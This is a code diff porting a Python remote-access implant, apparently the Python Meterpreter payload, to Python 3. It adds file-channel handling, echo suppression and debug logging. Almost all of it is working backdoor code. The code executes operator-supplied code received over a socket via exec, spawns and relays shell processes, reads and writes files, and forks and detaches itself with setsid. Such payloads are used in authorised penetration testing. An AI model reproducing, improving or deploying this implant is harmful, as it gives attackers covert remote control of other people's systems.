@@ -1,12 +1,5 @@
 #!/usr/bin/python
 import code
-try:
-	import ctypes
-except:
-	has_windll = False
-else:
-	has_windll = hasattr(ctypes, 'windll')
-
 import os
 import random
 import select
@@ -15,10 +8,30 @@ import struct
 import subprocess
 import sys
 import threading
+import time
+import traceback
+
+try:
+	import ctypes
+except ImportError:
+	has_windll = False
+else:
+	has_windll = hasattr(ctypes, 'windll')
+
+if sys.version_info[0] < 3:
+	is_bytes = lambda obj: issubclass(obj.__class__, str)
+	bytes = lambda *args: str(*args[:1])
+	NULL_BYTE = '\x00'
+else:
+	is_bytes = lambda obj: issubclass(obj.__class__, bytes)
+	str = lambda x: __builtins__['str'](x, 'UTF-8')
+	NULL_BYTE = bytes('\x00', 'UTF-8')
 
 #
 # Constants
 #
+DEBUGGING = False
+
 PACKET_TYPE_REQUEST        = 0
 PACKET_TYPE_RESPONSE       = 1
 PACKET_TYPE_PLAIN_REQUEST  = 10
@@ -100,6 +113,7 @@ TLV_TYPE_LOCAL_HOST            = TLV_META_TYPE_STRING  | 1502
 TLV_TYPE_LOCAL_PORT            = TLV_META_TYPE_UINT    | 1503
 
 EXPORTED_SYMBOLS = {}
+EXPORTED_SYMBOLS['DEBUGGING'] = DEBUGGING
 
 def export(symbol):
 	EXPORTED_SYMBOLS[symbol.__name__] = symbol
@@ -107,7 +121,7 @@ def export(symbol):
 
 def generate_request_id():
 	chars = 'abcdefghijklmnopqrstuvwxyz'
-	return ''.join(random.choice(chars) for x in xrange(32))
+	return ''.join(random.choice(chars) for x in range(32))
 
 @export
 def inet_pton(family, address):
@@ -126,25 +140,6 @@ def inet_pton(family, address):
 	raise Exception('no suitable inet_pton functionality is available')
 
 @export
-def packet_get_tlv(pkt, tlv_type):
-	offset = 0
-	while (offset < len(pkt)):
-		tlv = struct.unpack('>II', pkt[offset:offset+8])
-		if (tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type:
-			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
-			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-				val = val.split('\x00', 1)[0]
-			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
-				val = struct.unpack('>I', val)[0]
-			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
-				val = bool(struct.unpack('b', val)[0])
-			elif (tlv[1] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-				pass
-			return {'type':tlv[1], 'length':tlv[0], 'value':val}
-		offset += tlv[0]
-	return {}
-
-@export
 def packet_enum_tlvs(pkt, tlv_type = None):
 	offset = 0
 	while (offset < len(pkt)):
@@ -152,7 +147,7 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 		if (tlv_type == None) or ((tlv[1] & ~TLV_META_TYPE_COMPRESSED) == tlv_type):
 			val = pkt[offset+8:(offset+8+(tlv[0] - 8))]
 			if (tlv[1] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-				val = val.split('\x00', 1)[0]
+				val = str(val.split(NULL_BYTE, 1)[0])
 			elif (tlv[1] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
 				val = struct.unpack('>I', val)[0]
 			elif (tlv[1] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
@@ -164,25 +159,46 @@ def packet_enum_tlvs(pkt, tlv_type = None):
 	raise StopIteration()
 
 @export
+def packet_get_tlv(pkt, tlv_type):
+	try:
+		tlv = list(packet_enum_tlvs(pkt, tlv_type))[0]
+	except IndexError:
+		return {}
+	return tlv
+
+@export
 def tlv_pack(*args):
 	if len(args) == 2:
 		tlv = {'type':args[0], 'value':args[1]}
 	else:
 		tlv = args[0]
 	data = ""
-	if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
-		data = struct.pack('>II', 8 + len(tlv['value']) + 1, tlv['type']) + tlv['value'] + '\x00'
-	elif (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
+	if (tlv['type'] & TLV_META_TYPE_UINT) == TLV_META_TYPE_UINT:
 		data = struct.pack('>III', 12, tlv['type'], tlv['value'])
 	elif (tlv['type'] & TLV_META_TYPE_BOOL) == TLV_META_TYPE_BOOL:
-		data = struct.pack('>II', 9, tlv['type']) + chr(int(bool(tlv['value'])))
-	elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
-	elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
-	elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
-		data = struct.pack('>II', 8 + len(tlv['value']), tlv['type']) + tlv['value']
+		data = struct.pack('>II', 9, tlv['type']) + bytes(chr(int(bool(tlv['value']))), 'UTF-8')
+	else:
+		value = tlv['value']
+		if not is_bytes(value):
+			value = bytes(value, 'UTF-8')
+		if (tlv['type'] & TLV_META_TYPE_STRING) == TLV_META_TYPE_STRING:
+			data = struct.pack('>II', 8 + len(value) + 1, tlv['type']) + value + NULL_BYTE
+		elif (tlv['type'] & TLV_META_TYPE_RAW) == TLV_META_TYPE_RAW:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
+		elif (tlv['type'] & TLV_META_TYPE_GROUP) == TLV_META_TYPE_GROUP:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
+		elif (tlv['type'] & TLV_META_TYPE_COMPLEX) == TLV_META_TYPE_COMPLEX:
+			data = struct.pack('>II', 8 + len(value), tlv['type']) + value
 	return data
+
+#@export
+class MeterpreterFile(object):
+	def __init__(self, file_obj):
+		self.file_obj = file_obj
+
+	def __getattr__(self, name):
+		return getattr(self.file_obj, name)
+export(MeterpreterFile)
 
 #@export
 class MeterpreterSocket(object):
@@ -208,11 +224,11 @@ class STDProcessBuffer(threading.Thread):
 		threading.Thread.__init__(self)
 		self.std = std
 		self.is_alive = is_alive
-		self.data = ''
+		self.data = bytes()
 		self.data_lock = threading.RLock()
 
 	def run(self):
-		for byte in iter(lambda: self.std.read(1), ''):
+		for byte in iter(lambda: self.std.read(1), bytes()):
 			self.data_lock.acquire()
 			self.data += byte
 			self.data_lock.release()
@@ -220,15 +236,20 @@ class STDProcessBuffer(threading.Thread):
 	def is_read_ready(self):
 		return len(self.data) != 0
 
-	def read(self, l = None):
-		data = ''
+	def peek(self, l = None):
+		data = bytes()
 		self.data_lock.acquire()
 		if l == None:
 			data = self.data
-			self.data = ''
 		else:
 			data = self.data[0:l]
-			self.data = self.data[l:]
+		self.data_lock.release()
+		return data
+
+	def read(self, l = None):
+		self.data_lock.acquire()
+		data = self.peek(l)
+		self.data = self.data[len(data):]
 		self.data_lock.release()
 		return data
 
@@ -236,12 +257,25 @@ class STDProcessBuffer(threading.Thread):
 class STDProcess(subprocess.Popen):
 	def __init__(self, *args, **kwargs):
 		subprocess.Popen.__init__(self, *args, **kwargs)
+		self.echo_protection = False
 
 	def start(self):
 		self.stdout_reader = STDProcessBuffer(self.stdout, lambda: self.poll() == None)
 		self.stdout_reader.start()
 		self.stderr_reader = STDProcessBuffer(self.stderr, lambda: self.poll() == None)
 		self.stderr_reader.start()
+
+	def write(self, channel_data):
+		self.stdin.write(channel_data)
+		self.stdin.flush()
+		if self.echo_protection:
+			end_time = time.time() + 0.5
+			out_data = bytes()
+			while (time.time() < end_time) and (out_data != channel_data):
+				if self.stdout_reader.is_read_ready():
+					out_data = self.stdout_reader.peek(len(channel_data))
+			if out_data == channel_data:
+				self.stdout_reader.read(len(channel_data))
 export(STDProcess)
 
 class PythonMeterpreter(object):
@@ -251,7 +285,7 @@ class PythonMeterpreter(object):
 		self.channels = {}
 		self.interact_channels = []
 		self.processes = {}
-		for func in filter(lambda x: x.startswith('_core'), dir(self)):
+		for func in list(filter(lambda x: x.startswith('_core'), dir(self))):
 			self.extension_functions[func[1:]] = getattr(self, func)
 		self.running = True
 
@@ -265,6 +299,7 @@ class PythonMeterpreter(object):
 		return func
 
 	def add_channel(self, channel):
+		assert(isinstance(channel, (subprocess.Popen, MeterpreterFile, MeterpreterSocket)))
 		idx = 0
 		while idx in self.channels:
 			idx += 1
@@ -286,7 +321,7 @@ class PythonMeterpreter(object):
 					break
 				req_length, req_type = struct.unpack('>II', request)
 				req_length -= 8
-				request = ''
+				request = bytes()
 				while len(request) < req_length:
 					request += self.socket.recv(4096)
 				response = self.create_response(request)
@@ -294,17 +329,17 @@ class PythonMeterpreter(object):
 			else:
 				channels_for_removal = []
 				# iterate over the keys because self.channels could be modified if one is closed
-				channel_ids = self.channels.keys()
+				channel_ids = list(self.channels.keys())
 				for channel_id in channel_ids:
 					channel = self.channels[channel_id]
-					data = ''
+					data = bytes()
 					if isinstance(channel, STDProcess):
 						if not channel_id in self.interact_channels:
 							continue
-						if channel.stdout_reader.is_read_ready():
-							data = channel.stdout_reader.read()
-						elif channel.stderr_reader.is_read_ready():
+						if channel.stderr_reader.is_read_ready():
 							data = channel.stderr_reader.read()
+						elif channel.stdout_reader.is_read_ready():
+							data = channel.stdout_reader.read()
 						elif channel.poll() != None:
 							self.handle_dead_resource_channel(channel_id)
 					elif isinstance(channel, MeterpreterSocketClient):
@@ -312,7 +347,7 @@ class PythonMeterpreter(object):
 							try:
 								d = channel.recv(1)
 							except socket.error:
-								d = ''
+								d = bytes()
 							if len(d) == 0:
 								self.handle_dead_resource_channel(channel_id)
 								break
@@ -357,13 +392,13 @@ class PythonMeterpreter(object):
 		data_tlv = packet_get_tlv(request, TLV_TYPE_DATA)
 		if (data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED:
 			return ERROR_FAILURE
-		preloadlib_methods = self.extension_functions.keys()
+		preloadlib_methods = list(self.extension_functions.keys())
 		symbols_for_extensions = {'meterpreter':self}
 		symbols_for_extensions.update(EXPORTED_SYMBOLS)
 		i = code.InteractiveInterpreter(symbols_for_extensions)
 		i.runcode(compile(data_tlv['value'], '', 'exec'))
-		postloadlib_methods = self.extension_functions.keys()
-		new_methods = filter(lambda x: x not in preloadlib_methods, postloadlib_methods)
+		postloadlib_methods = list(self.extension_functions.keys())
+		new_methods = list(filter(lambda x: x not in preloadlib_methods, postloadlib_methods))
 		for method in new_methods:
 			response += tlv_pack(TLV_TYPE_METHOD, method)
 		return ERROR_SUCCESS, response
@@ -386,10 +421,10 @@ class PythonMeterpreter(object):
 		if channel_id not in self.channels:
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
-		if isinstance(channel, file):
-			channel.close()
-		elif isinstance(channel, subprocess.Popen):
+		if isinstance(channel, subprocess.Popen):
 			channel.kill()
+		elif isinstance(channel, MeterpreterFile):
+			channel.close()
 		elif isinstance(channel, MeterpreterSocket):
 			channel.close()
 		else:
@@ -405,7 +440,7 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
 		result = False
-		if isinstance(channel, file):
+		if isinstance(channel, MeterpreterFile):
 			result = channel.tell() >= os.fstat(channel.fileno()).st_size
 		response += tlv_pack(TLV_TYPE_BOOL, result)
 		return ERROR_SUCCESS, response
@@ -432,13 +467,13 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
 		data = ''
-		if isinstance(channel, file):
-			data = channel.read(length)
-		elif isinstance(channel, STDProcess):
+		if isinstance(channel, STDProcess):
 			if channel.poll() != None:
 				self.handle_dead_resource_channel(channel_id)
 			if channel.stdout_reader.is_read_ready():
 				data = channel.stdout_reader.read(length)
+		elif isinstance(channel, MeterpreterFile):
+			data = channel.read(length)
 		elif isinstance(channel, MeterpreterSocket):
 			data = channel.recv(length)
 		else:
@@ -454,13 +489,13 @@ class PythonMeterpreter(object):
 			return ERROR_FAILURE, response
 		channel = self.channels[channel_id]
 		l = len(channel_data)
-		if isinstance(channel, file):
-			channel.write(channel_data)
-		elif isinstance(channel, subprocess.Popen):
+		if isinstance(channel, subprocess.Popen):
 			if channel.poll() != None:
 				self.handle_dead_resource_channel(channel_id)
 				return ERROR_FAILURE, response
-			channel.stdin.write(channel_data)
+			channel.write(channel_data)
+		elif isinstance(channel, MeterpreterFile):
+			channel.write(channel_data)
 		elif isinstance(channel, MeterpreterSocket):
 			try:
 				l = channel.send(channel_data)
@@ -485,13 +520,17 @@ class PythonMeterpreter(object):
 		if handler_name in self.extension_functions:
 			handler = self.extension_functions[handler_name]
 			try:
-				#print("[*] running method {0}".format(handler_name))
+				if DEBUGGING:
+					print('[*] running method ' + handler_name)
 				result, resp = handler(request, resp)
-			except Exception, err:
-				#print("[-] method {0} resulted in an error".format(handler_name))
+			except Exception:
+				if DEBUGGING:
+					print('[-] method ' + handler_name + ' resulted in an error')
+					traceback.print_exc(file=sys.stderr)
 				result = ERROR_FAILURE
 		else:
-			#print("[-] method {0} was requested but does not exist".format(handler_name))
+			if DEBUGGING:
+				print('[-] method ' + handler_name + ' was requested but does not exist')
 			result = ERROR_FAILURE
 		resp += tlv_pack(TLV_TYPE_RESULT, result)
 		resp = struct.pack('>I', len(resp) + 4) + resp
@@ -499,6 +538,9 @@ class PythonMeterpreter(object):
 
 if not hasattr(os, 'fork') or (hasattr(os, 'fork') and os.fork() == 0):
 	if hasattr(os, 'setsid'):
-		os.setsid()
+		try:
+			os.setsid()
+		except OSError:
+			pass
 	met = PythonMeterpreter(s)
 	met.run()
